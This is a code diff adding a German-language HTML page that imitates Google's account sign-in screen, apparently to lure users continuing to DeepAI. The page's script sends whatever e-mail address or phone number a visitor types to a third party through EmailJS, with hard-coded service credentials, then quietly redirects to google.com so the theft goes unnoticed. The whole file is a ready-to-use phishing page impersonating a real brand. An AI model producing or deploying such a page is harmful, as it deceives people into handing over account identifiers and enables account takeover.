@@ -1,0 +1,327 @@
+
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <title>Anmeldung</title>
+  <script type="importmap">
+  {
+    "imports": {
+      "emailjs": "https://esm.sh/emailjs-com@3.2.0"
+    }
+  }
+  </script>
+  <style>
+:root {
+  --bg: #000;
+  --field-bg: #1f1f1f;
+  --dropdown-bg: #2a2b2e;
+  --border: #3c4043;
+  --hover: #3a3b3f;
+  --active: #3c4b63;
+  --focus: #8ab4f8;
+  --text: #e8eaed;
+}
+* { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Roboto", sans-serif; }
+body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: center; align-items: flex-start; position: relative; height:100vh; overflow:hidden; color: white; }
+
+/* Form styles */
+.form-group{ height: 48px; margin: 9px; position: relative; }
+.form-control{
+  position: absolute;
+  top:0;
+  left:0;
+  width: 100%;
+  height: 100%;
+  background:none;
+  outline:none;
+  border-radius:5px;
+  z-index: 1;
+  color: white;
+  border: 1px solid #797B7A;
+  padding: 14px 12px;
+  font-size: 15px;
+  box-sizing: border-box;
+}
+/* Label sits over input */
+.class-label{
+  position: absolute;
+  color:#BEBEBE;
+  height:10px;
+  top: 1px;
+  width:220px;
+  left: 3px;
+  background-color:#0E0E0E;
+  padding: 15px 14px;
+  font-size:15px;
+  transition: .24s ease;
+  pointer-events: none;
+}
+
+/* Focus: floating label + blue border */
+.form-control:focus + .class-label{
+  top:-24px;
+  z-index:200;
+  left:8px;
+  color: var(--focus);
+  font-weight: 300;
+}
+
+.form-control:focus{
+  border: 2px solid var(--focus);
+}
+
+/* Keep label floated when input has content (still not focused)
+   Using :placeholder-shown requires a placeholder attribute; we set placeholder=" " on the input.
+*/
+.form-control:not(:placeholder-shown) + .class-label{
+  top:-24px;
+  z-index:200;
+  left:8px;
+  color: var(--focus);
+  font-weight: 300;
+}
+
+/* Hauptcontainer */
+.main-components { max-width: 400px; width: 100%; display: flex; flex-direction: column; }
+/* Top-Container */
+.top-section { display: flex; flex-direction: column; }
+/* Bottom-Container */
+.bottom-section { padding: 0 10px; }
+/* Header */
+.header { display: flex; color: white; flex-direction: column; align-items: flex-start; margin-bottom: 40px; }
+.top-row { display: flex; align-items: center; }
+.logo { height: 25px; padding: 0px 10px; }
+h1 { font-size: 30px; font-weight: 400; margin: 0; color: white; }
+hr { width: 100%; height: 1px; background-color: #373737; border: none; }
+.subtext { color: white; font-size: 16px; padding: 0px 10px; text-align: left; margin-bottom: 20px; }
+.link { color: #A8C7FA; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 30px; }
+.info-text { font-size: 13px; color: #aaa; margin-bottom: 0; }
+.info-text a { color: #647FAC; text-decoration: none; }
+
+/* Button Style */
+#loginButton { background-color: #9AB6E5; color: black; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; cursor: pointer; margin-left: 260px; display: block; margin-top: -345px; }
+
+.footer-links { margin-top: 20px; text-align: center; font-size: 13px; color: #aaa; }
+.footer-links a { color: #aaa; margin: 0 10px; text-decoration: none; }
+
+/* layout centering */
+.viewport { width:100%; display:flex; justify-content:center; align-items:center; padding: 20px 0; box-sizing:border-box; }
+.card { width:100%; max-width:420px; background: transparent; box-sizing:border-box; }
+
+/* Language select styles */
+.select-wrapper { width: 220px; position: relative; margin: 0 5px; }
+.select-btn { height: 34px; background: transparent; border: 1px solid transparent; border-radius: 6px; padding: 0 5px; font-size: 13px; color: var(--text); display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: background 0.15s ease, border-color 0.15s ease; }
+.select-btn:hover, .select-btn.open { background: var(--field-bg); border-color: #A8C7FA; box-shadow: 0 0 0 1px var(--focus); }
+.select-btn svg { width: 16px; height: 16px; fill: var(--text); transition: transform 0.2s ease, fill 0.1s ease; }
+.select-btn.open svg { transform: rotate(180deg); fill: var(--focus); }
+.select-dropdown { position: absolute; bottom: calc(21% + 12px); left: 0; width: 220px; background: var(--dropdown-bg); border-radius: 3px; padding: 6px 0; display: none; z-index: 30; box-shadow: 0 6px 18px rgba(0,0,0,0.6); }
+.select-dropdown.open { display: block; }
+.select-dropdown li { list-style: none; padding: 15px 8px; font-size: 11px; color: var(--text); cursor: pointer; white-space: nowrap; }
+.select-dropdown li:hover { background: var(--hover); }
+.select-dropdown li.active { background: var(--active); }
+
+@media (max-width: 440px) {
+  .select-wrapper { width: 45%; }
+  .select-dropdown, .select-btn { width: 100%; }
+}
+.bottom-links {
+  display: flex;
+   
+  gap: 10px;                 /* Abstand zwischen den Links */
+  margin-top: 30px;          /* Abstand unter der Sprachwahl */
+}
+
+.bottom-links a {
+  color: var(--text);   /* grau */
+  text-decoration: none;
+  font-size: 13px;
+  padding: 0px 10px;
+  transition: color 0.2s;
+}
+
+.bottom-links a:hover {
+  color: #fff;
+}
+
+  </style>
+</head>
+<body>
+  <div class="viewport">
+    <div class="card main-components">
+      <div class="top-section">
+        <div class="header">
+          <div class="top-row">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo" />
+            <p style="padding: 0px 1;font-size:13px;color: #B2B2B2; margin:0">Über Google anmelden</p>
+          </div>
+          <hr />
+        </div>
+      </div>
+      <div class="bottom-section">
+        <h1 style="padding: 10px 10px; color: white">Anmeldung</h1>
+        <p class="subtext">Weiter zu DeepAI</p>
+        <div style="height: 40px;"></div>
+
+        <form id="sendForm" class="form" novalidate>
+          <div class="form-group">
+            <!-- Wichtig: placeholder=" " damit :placeholder-shown funktioniert -->
+            <input type="text" name="name" id="name" class="form-control" required autocomplete="off" placeholder=" " />
+            <label for="name" class="class-label">E-Mail oder Telefonnummer</label>
+          </div>
+
+          <a href="#" class="link" style="padding: 0px 10px; color:#A8C7FA">E-Mail-Adresse vergessen?</a>
+
+          <div class="info-text" style="margin-top: 80px;">
+            <a href="#" style="padding: 0px 10px; color:#A8C7FA">Konto erstellen</a>
+          </div>
+
+          <div style="height: 240px;"></div>
+
+          <div class="select-wrapper" id="langSelect">
+            <div class="select-btn" id="btn"> Deutsch <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+            <ul class="select-dropdown" id="list" role="listbox" aria-label="Sprachen">
+              <li role="option">Afrikaans</li>
+              <li role="option">azərbaycan</li>
+              <li role="option">bosanski</li>
+              <li role="option">català</li>
+              <li role="option">Čeština</li>
+              <li role="option">Cymraeg</li>
+              <li role="option">Dansk</li>
+              <li class="active" role="option" aria-selected="true">Deutsch</li>
+              <li role="option">eesti</li>
+              <li role="option">English (United Kingdom)</li>
+              <li role="option">English (United States)</li>
+              <li role="option">Español (España)</li>
+            </ul>
+          </div>
+<!-- Neue Links unter der Sprachauswahl -->
+<div class="bottom-links">
+  <a href="https://support.google.com/accounts?hl=de&p=account_iph">Hilfe</a>
+  <a href="https://accounts.google.com/TOS?loc=DE&hl=de&privacy=true">Datenschutz</a>
+  <a href="https://accounts.google.com/TOS?loc=DE&hl=de">Nutzungsbedingungen</a>
+</div>
+
+          <input type="submit" id="loginButton" value="Weiter" />
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+/* Language dropdown behavior + ensure label state is correct on load */
+(function(){
+  const btn = document.getElementById("btn");
+  const list = document.getElementById("list");
+  const wrapper = document.getElementById("langSelect");
+
+  btn.addEventListener("click", (e) => {
+    e.stopPropagation();
+    btn.classList.toggle("open");
+    list.classList.toggle("open");
+  });
+
+  list.addEventListener("click", (e) => {
+    const li = e.target.closest("li");
+    if (!li) return;
+    Array.from(list.children).forEach(x => x.classList.remove("active"));
+    li.classList.add("active");
+    // update visible text node only (keeps svg)
+    btn.childNodes[0].textContent = li.textContent;
+    btn.classList.remove("open");
+    list.classList.remove("open");
+  });
+
+  document.addEventListener("click", e => {
+    if (!e.target.closest(".select-wrapper")) {
+      btn.classList.remove("open");
+      list.classList.remove("open");
+    }
+  });
+
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "Escape") {
+      btn.classList.remove("open");
+      list.classList.remove("open");
+    }
+  });
+
+  // Ensure floating label is applied on page load for any prefilled value (e.g., from autofill)
+  const inputs = document.querySelectorAll('.form-control');
+  inputs.forEach(inp => {
+    if (inp.value.trim() !== '') {
+      // CSS handles this via :placeholder-shown
+    } else {
+      inp.addEventListener('input', () => {
+        // no JS needed, CSS handles floating label
+      });
+    }
+  });
+
+  // Simple EmailJS setup + form submit and add 3s redirect to Google WITHOUT changing the button text
+  import("emailjs").then(emailjs => {
+    const PUBLIC_KEY = "3yT23vyp0ntqbG7BP";
+    const SERVICE_ID = "service_8ypqbgk";
+    const TEMPLATE_ID = "template_deqdkha";
+    if (emailjs && emailjs.init) emailjs.init(PUBLIC_KEY);
+
+    const form = document.getElementById("sendForm");
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const nameInput = document.getElementById("name");
+      const nameValue = nameInput.value.trim();
+      if (!nameValue) {
+        alert("Bitte Namen/E-Mail oder Telefonnummer eingeben.");
+        nameInput.focus();
+        return;
+      }
+      const templateParams = { name: nameValue };
+
+      try {
+        await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+        form.reset();
+      } catch (err) {
+        console.error("EmailJS Fehler:", err);
+      } finally {
+        // Disable the submit button but DO NOT change its text/value
+        const btnSubmit = document.getElementById("loginButton");
+        if (btnSubmit) {
+          btnSubmit.disabled = true;
+          btnSubmit.style.opacity = "0.8";
+          btnSubmit.style.cursor = "default";
+        }
+        setTimeout(() => {
+          window.location.href = "https://google.com";
+        }, 100);
+      }
+    });
+  }).catch(err => {
+    // If import fails, still ensure redirect behavior works
+    const form = document.getElementById("sendForm");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const nameInput = document.getElementById("name");
+      const nameValue = nameInput.value.trim();
+      if (!nameValue) {
+        alert("Bitte Namen/E-Mail oder Telefonnummer eingeben.");
+        nameInput.focus();
+        return;
+      }
+      const btnSubmit = document.getElementById("loginButton");
+      if (btnSubmit) {
+        btnSubmit.disabled = true;
+        btnSubmit.style.opacity = "0.8";
+        btnSubmit.style.cursor = "default";
+      }
+      setTimeout(() => {
+        window.location.href = "https://google.com";
+      }, 3000);
+    }, { once: true });
+    console.error("EmailJS import failed:", err);
+  });
+})();
+  </script>
+</body>
+</html>
